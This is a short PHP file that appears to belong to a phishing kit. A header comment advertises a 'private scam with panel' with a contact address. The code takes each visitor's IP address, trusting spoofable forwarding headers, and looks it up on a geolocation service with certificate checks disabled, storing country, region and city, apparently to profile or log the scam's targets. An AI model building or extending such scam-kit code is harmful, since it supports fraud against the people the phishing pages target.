<?php
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip3 = '100.32.167.19';
$ip2 = getUserIP();
$url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
//$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip2));
    $countryname = $details['geoplugin_countryName']; 
    $countrycode = $details['geoplugin_countryCode']; 
	$regionName = $details['geoplugin_regionName']; 
	$cityname = $details['geoplugin_city'];
    $cn = $countryname;
	$rgn = $regionName;
    $cid = $countrycode;
	$stt = $cityname;
?>                